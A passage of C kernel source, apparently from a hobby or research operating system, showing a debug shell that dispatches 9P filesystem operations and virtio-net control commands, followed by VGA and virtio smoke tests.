                operative_fid = tx_p9_walk(p9_vq0, p9_vq0_idx, base_fid, dest);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED path traversal\r\n");
                } else {
                    kprintiln(operative_fid);
                }
            } else if (!strncmp(cmd, "p9_walk_rel ", 12)) {
                char* dest = cmd + 12;
                operative_fid = tx_p9_walk(p9_vq0, p9_vq0_idx, operative_fid, dest);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED path traversal\r\n");
                } else {
                    kprintiln(operative_fid);
                }
            } else if (!strncmp(cmd, "p9_create_file ", 15)) {
                char* file = cmd + 15;
                // replaces operative fid
                tx_p9_create(p9_vq0, p9_vq0_idx, operative_fid, file, 0);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED create file\r\n");
                } else {
                    kprintiln(operative_fid);
                }
            } else if (!strncmp(cmd, "p9_create_dir ", 14)) {
                char* file = cmd + 14;
                // replaces operative fid
                tx_p9_create(p9_vq0, p9_vq0_idx, operative_fid, file, 1);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED create dir\r\n");
                } else {
                    kprintiln(operative_fid);
                }
            } else if (!strncmp(cmd, "p9_write_file ", 14)) {
                char* content = cmd + 14;
                tx_p9_write_file(p9_vq0, p9_vq0_idx, operative_fid, content);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED write file\r\n");
                } else {
                    kprintiln(operative_fid);
                }
            } else if (!strncmp(cmd, "p9_read_file", 12)) {
                int old_intr_cnt = p9_intrs;
                tx_p9_read_file(p9_vq0, p9_vq0_idx, operative_fid);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED read file\r\n");
                } else {
                    int new_intr_cnt = p9_intrs;
                    while (old_intr_cnt == VGA[0]) {
                        new_intr_cnt = p9_intrs;
                    }
                    uint32_t* count = (uint32_t*)msg->body;
                    while (*count == 0)
                        ;
                    kprints(msg->body + 4);
                }
            } else if (!strncmp(cmd, "p9_open_file", 12)) {
                tx_p9_open_file(p9_vq0, p9_vq0_idx, operative_fid);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED open file\r\n");
                } else {
                    kprinti(operative_fid);
                }
            } else if (!strncmp(cmd, "p9_clunk", 8)) {
                tx_p9_clunk(p9_vq0, p9_vq0_idx, operative_fid);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED clunk file\r\n");
                } else {
                    kprinti(operative_fid);
                }
            } else if (!strncmp(cmd, "p9_remove", 9)) {
                tx_p9_remove(p9_vq0, p9_vq0_idx, operative_fid);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED remove file\r\n");
                } else {
                    kprinti(operative_fid);
                }
            } else if (!strcmp(cmd, "tx_pkt")) {
                test_pkt_tx(net_vq1, net_vq1_idx);
                net_vq1_idx = (net_vq1_idx + 1) % 10;
            } else if (!strcmp(cmd, "tx_ipv4_pkt")) {
                test_ipv4_pkt_tx(net_vq1, net_vq1_idx);
                net_vq1_idx = (net_vq1_idx + 1) % 10;
            } else if (!strcmp(cmd, "rx_pkt")) {
                test_pkt_rx(net_vq2, net_vq2_idx);
                net_vq2_idx = (net_vq2_idx + 1) % 10;
            } else if (!strcmp(cmd, "net_set_driver_features")) {
                net_set_driver_features();
            } else if (!strcmp(cmd, "net_enable_promisc")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 3, 1);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_disable_promisc")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 3, 0);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_enable_chksum_tx")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 1, 1);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_disable_chksum_tx")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 1, 0);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_enable_chksum_rx")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 2, 1);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_disable_chksum_rx")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 2, 0);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_enable_rx_eth")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 4, 1);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_disable_rx_eth")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 4, 0);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_enable_tx_eth")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 5, 1);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "net_disable_tx_eth")) {
                net_send_ctrl_message(net_vq0, net_vq0_idx, 5, 0);
                net_vq0_idx = (net_vq0_idx + 1);
            } else if (!strcmp(cmd, "test_ogx")) {
                test_ogx();
            } else if (!strcmp(cmd, "test_ogx_patch"))
                test_ogx_patch();
            else {
                kprints(cmd);
                kprints(": not found\r\n");
            }
        }
    }

    // test VGA
    VGA[0] = 0x42;
    VGA[0] = cpu_id;

    // test virtio (via net dev)
    struct virtq* vq0 = setup_virtq(net, 4, BUF_SIZE, 0);
    ((uint32_t*)vq0->desc[0].addr)[0] = 0xdeadbeef;

    VGA = (uint8_t*)(0xB8000);
    VGA[0] = 0x41;
    VGA[1] = 0x41;

    while (1) {
    }

    return;
}
